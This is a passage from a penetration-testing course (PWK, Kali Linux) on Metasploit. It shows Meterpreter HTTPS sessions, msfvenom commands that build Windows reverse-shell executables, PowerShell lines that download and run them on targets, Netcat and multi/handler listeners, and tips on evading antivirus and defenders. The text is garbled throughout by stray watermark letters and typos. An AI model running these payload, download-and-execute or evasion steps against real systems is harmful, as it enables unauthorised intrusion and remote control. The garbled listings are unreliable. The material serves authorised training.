[*] http://192.168.50.16:80 - Sending linux/x64/meterpreter_ryeverse_https command
payload
[*] https://192.168.119.4:4444 handling request from 192.168.50.16; (UUID: qtj6ydxw)
k
Redirecting stageless connection from
/5VnUXDPXWg8tIisgT9LKKgwTqHpOmN8f7XNCTWkhcIUx8BfEHpEp4kLUgOa_JWrqyM8EB with UA
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWesbKit/537.36 (KHTML, like Gecko)
Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69'
...
o
[*] https://192.168.119.4:4444 handling request from 192.168.50.16; (UUID: qtj6ydxw)
Attaching orphaned/stageless session...
[*] Meterpreter session 5 opened (192.168.119.4:4444 -> 127.0.0.1) at 2022-08-08
n
06:12:42 -0400
[!] This exploit may require manual cleanup of '/tmp/IkXnnbYT' on the target
i
meterpreter >
z
Listing 661 - Display output of Meterpreter HTTPS non-staged payload
Listing 661 shows that the payload provided us with a Meterpreter session. The output displays
D
the handling of various requests until the Meterpreter session is established. If a defender
monitors the payload’s communication, it seems like regular HTTPS traffic. Furthermore, if they
would check the address of the communication endpoint (our Kali machine in this example),
they’d only get a Not found page with HTTP code 404987 in the browser.
In a penetration test, we can use this payload to improve our chances of bypassing security
technology and defenders. However, as Metasploit is one of the most well-known exploit
frameworks, the detection rates of Meterpreter payloads are quite high by security technologies
such as antivirus solutions. Therefore, we should always attempt to obtain an initial foothold with
a raw TCP shell and then deploy a Meterpreter shell as soon as we have disabled or bypassed
potential security technologies. However, this kind of obfuscation is outside of the scope of this
Module.
Let’s summarize what we’ve covered in this section. Meterpreter is Metasploit’s signature payload
and includes many great features. We first discussed what Meterpreter is and then used a raw
TCP Meterpreter payload on WEB18. Then, we familiarized ourselves with basic commands and
the concept of channels. Finally, we explored the HTTPS Meterpreter payload and discussed how
it differs from the raw TCP payload.
987 (Wikipedia, 2022), https://en.wikipedia.org/wiki/HTTP_404
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 662
Made in Morocco
Penetration Testing with Kali Linux
20.2.3 Executable Payloads
Metasploit also provides the functionality to export payloads into various file types and formats
such as Windows and Linux binaries, webshells, and more. Metasploit contains msfvenom988 as a
standalone tool to generate these payloads. It provides standardized command line options and
includes various techniques to customize payloads.
To get familiar with msfvenom, we’ll first create a malicious Windows binary starting a raw TCP
reverse shell. Let’s begin by listing all payloads with payloads as argument for -l. In addition, we
use --platform to specify the platform for the payload and --arch for the architecture.
kali@kali:~$ msfvenom -l payloads --platform windows --arch x64
...
windows/x64/shell/reverse_tcp Spawn a piped command shell (Windows x64)
y
(staged). Connect back to the attacker (Windows x64)
...
windows/x64/shell_reverse_tcp Connect backk to attacker and spawn a
command shell (Windows x64)
...
s
Listing 662 - Creating a Windows executable with a reverse shell payload
Listing 662 shows that we can choose between a staged and non-staged payload. For this
o
example, we’ll use the non-staged payload first.
Now, let’s use the -p flag to set the payloadn, set LHOST and LPORT to assign the host and port for
the reverse connection, -f to set the output format (exe in this case), and -o to specify the output
file name:
i
kali@kali:~$ msfvenom -p windozws/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -
f exe -o nonstaged.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
D
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: nonstaged.exe
Listing 663 - Creating a Windows executable with a non-staged TCP reverse shell payload
Now that we have created the malicious binary file, let’s use it. For this, we start a Netcat listener
on port 443, Python3 web server on port 80, and connect to BRUTE2 via RDP with user justin and
password SuperS3cure1337#. Once we’ve connected over RDP, we can start PowerShell to
transfer the file and execute it.
PS C:\Users\justin> iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
PS C:\Users\justin> .\nonstaged.exe
Listing 664 - Download non-staged payload binary and execute it
Once we executed the binary file, we’ll receive an incoming reverse shell on our Netcat listener.
988 (Metasploit Documentation, 2022), https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 663
Made in Morocco
Penetration Testing with Kali Linux
kali@kali:~$ nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.202] 50822
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.
C:\Users\justin>
Listing 665 - Incoming reverse shell from non-staged Windows binary
Now, let’s use a staged payload to do the same. For this, we’ll again use msfvenom to create a
Windows binary with a staged TCP reverse shell payload.
kali@kali:~$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -
f exe -o staged.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload y
No encoder specified, outputting raw payload
Payload size: 510 bytes
k
Final size of exe file: 7168 bytes
Saved as: staged.exe
Listing 666 - Creating a Windows executable with a sstaged TCP reverse shell payload
We’ll repeat the steps from Listing 664 to download and execute staged.exe. We’ll also start the
Netcat listener again. o
kali@kali:~$ nc -nvlp 443
n
listening on [any] 443 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.202] 50832
whoami
i
Listing 667 - Incoming reverse shell from staged Windows binary
z
While we received an incoming connection, we cannot execute any commands through it. This is
because Netcat doesn’t know how to handle a staged payload.
D
To get a functional interactive command prompt, we can use Metasploit’s multi/handler989
module, which works for the majority of staged, non-staged, and more advanced payloads. Let’s
use this module to receive the incoming connection from staged.exe.
In Metasploit, let’s select the module with use. Then, we have to specify the payload of the
incoming connection. In our case, this is windows/x64/shell/reverse_tcp. In addition, we have to
set the options for the payload. We enter the IP of our Kali machine as argument for LHOST and
port 443 as argument for LPORT. Finally, we can enter run to launch the module and set up the
listener.
msf6 exploit(multi/http/apache_normalize_path_rce) > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(multi/handler) > show options
...
989 (Rapid7, 2018), https://www.rapid7.com/db/modules/exploit/multi/handler/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 664
Made in Morocco
Penetration Testing with Kali Linux
Payload options (windows/x64/shell/reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC process yes Exit technique (Accepted: '', seh, thread,
process, none)
LHOST yes The listen address (an interface may be
specified)
LPORT 4444 yes The listen port
...
msf6 exploit(multi/handler) > set LHOST 192.168.119.2
LHOST => 192.168.119.2
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run y
[*] Started reverse TCP handler on 192.168.119.2:443
Listing 668 - Set payload and options for multi/hankdler and launch it
Once our listener is running on port 443, we can start staged.exe again on BRUTE2. Our
s
Metasploit multi/handler receives the incoming staged payload and provides us with an
interactive reverse shell in the context of a session.
o
[*] Started reverse TCP handler on 192.168.119.2:443
[*] Sending stage (336 bytes) to 192.168.50.202
[*] Command shell session 6 opened (192n.168.119.2:443 -> 192.168.50.202:50838) at
2022-08-01 10:18:13 -0400
i
Shell Banner: z
Microsoft Windows [Version 10.0.20348.169]
-----
D
C:\Users\justin> whoami
whoami
brute2\justin
Listing 669 - Incoming reverse shell from Windows binary with staged payload
Nice! We received the staged reverse shell and Metasploit started a session for us to use. For
staged and other advanced payload types (such as Meterpreter), we must use multi/handler
instead of tools like Netcat in order for the payload to work.
Using run without any arguments will block the command prompt until execution finishes or we
background the session. As we’ve learned before, we can use run -j to start the listener in the
background, allowing us to continue other work while we wait for the connection. We can use the
jobs command to get a list of all currently active jobs, such as active listeners waiting for
connections.
Let’s exit our session and restart the listener with run -j. Then, we’ll list the currently active jobs
using jobs. Once we execute staged.exe again, Metasploit notifies us that a new session was
created.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 665
Made in Morocco
Penetration Testing with Kali Linux
C:\Users\justin> exit
exit
[*] 192.168.50.202 - Command shell session 6 closed. Reason: User exit
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 192.168.119.2:443
msf6 exploit(multi/handler) > jobs
Jobs
====
Id Name Payload yPayload opts
-- ---- ------- ------------
1 Exploit: multi/handler windows/x64/shell/reverse_tcp tcp://192.168.119.2:443
k
msf6 exploit(multi/handler) >
[*] Sending stage (336 bytes) to 192.168.50.202
s
[*] Command shell session 7 opened (192.168.119.2:443 -> 192.168.50.202:50839) at
2022-08-01 10:26:02 -0400
Listing 670 - Incoming reverse shell fromo Windows binary with staged payload
As Metasploit created a new session for the incoming connection, we could now again interact
with it with sessions -i and the session ID ans argument.
We can use the generated executable payloads from msfvenom in various situations during a
i
penetration test. First, we can use them to create executable file types such as PowerShell
scripts, Windows executables, orz Linux executable files to transfer them to a target and start a
reverse shell. Next, we can create malicious files such as web shells to exploit web application
vulnerabilities. Finally, we caDn also use the generated files from msfvenom as part of a client-side
attack.
In this section, we explored executable payloads generated with msfvenom. We got familiar with
how we can use msfvenom to generate executable files containing these payloads and how to
set up multi/handler as listener for staged and non-staged payloads alike. Using msfvenom to
generate executable files with various payloads and in numerous file types will assist us greatly in
penetration tests.
20.3 Performing Post-Exploitation with Metasploit
This Learning Unit covers the following Learning Objectives:
• Use core Meterpreter post-exploitation features
• Use post-exploitation modules
• Perform pivoting with Metasploit
Once we gain access to a target machine, we can move on to the post-exploitation phase where
we gather information, take steps to maintain our access, pivot to other machines, elevate our
privileges, and so on.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 666
Made in Morocco
Penetration Testing with Kali Linux
The Metasploit Framework has several interesting post-exploitation features that can simplify
many aspects of the process. In addition to the built-in Meterpreter commands, a number of post-
exploitation MSF modules take an active session as an argument and perform post-exploitation
operations on them.
In this Learning Unit, we’ll explore these post-exploitation features and modules. We’ll also
perform pivoting with modules of the Metasploit Framework.
20.3.1 Core Meterpreter Post-Exploitation Features
In previous sections, we used the Meterpreter payload to navigate the file system, obtain
information about the target system, and transfer files to and from the machine. Apart from the
commands we already used, Meterpreter contains numerous post-exploitation features.
Let’s explore some of these features. We should note that the Linux Meterpreter payload contains
y
fewer post-exploitation features than the Windows one. Therefore, we’ll explore these features on
the Windows target ITWK01. Let’s assume we already gained an initial foothold on the target
k
system and deployed a bind shell as way of accessing the system.
To begin, we’ll create an executable Windows binary wsith msfvenom containing a non-staged
Meterpreter payload and name it met.exe.
o
kali@kali:~$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4
LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
n
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201820 bytes
i
Final size of exe file: 208384 bytes
z
Saved as: met.exe
Listing 671 - Create a Windows executable with a Meterpreter reverse shell payload
D
After we set the payload and its options, we launch the previously activated multi/handler module
in Metasploit.
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
payload => windows/x64/meterpreter_reverse_https
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > run
[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.
[*] Started HTTPS reverse handler on https://192.168.119.4:443
Listing 672 - Set options and start multi/handler
Next, we start a Python3 web server to serve met.exe. Then, we connect to the bind shell on port
4444 on ITWK01. Once connected, we can download met.exe with PowerShell and start the
Windows binary.
kali@kali:~$ nc 192.168.50.223 4444
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 667
Made in Morocco
Penetration Testing with Kali Linux
C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
PS C:\Users\dave> iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
PS C:\Users\dave> .\met.exe
.\met.exe
PS C:\Users\dave> y
Listing 673 - Connect to CLIENTWK220 and execute met.exe after downloading it
Once the Windows binary is executed, Metasploit notifies us thkat it opened a new session.
[*] Started HTTPS reverse handler on https://192.168.119.4:443
s
[*] https://192.168.119.4:443 handling request from 192.168.50.223; (UUID: vu4ouwcd)